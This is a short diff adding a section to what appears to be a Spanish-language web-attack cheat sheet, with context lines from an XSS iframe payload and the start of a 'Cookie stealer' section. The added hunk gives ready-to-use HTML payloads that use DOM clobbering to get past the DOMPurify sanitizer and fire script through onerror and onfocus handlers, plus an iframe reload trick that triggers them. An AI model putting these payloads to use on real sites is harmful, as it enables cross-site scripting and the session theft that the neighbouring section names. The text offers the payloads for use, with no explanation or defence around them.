@@ -157,6 +157,15 @@ script-src-elem 'unsafe-inline'
 <iframe src="https://URL/product?productId=3&'><script>alert(0)</script>" onload="if(!window.x)this.src='https://URL';window.x=1;"></iframe>
 ```
 
+*Explotando DOM Cloberring y DOM purify*
+```html
+<a id=defaultAvatar>
+<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(0)>//">
+
+<form id=x tabindex=0 onfocus=alert(0)><input id=attributes>
+<iframe src="https://URL/post?postId=4" onload="setTimeout(() => this.src += '#x', 500);"></iframe>
+
+```
 ---
 ## **Stealers**
 ### **Cookie stealer**
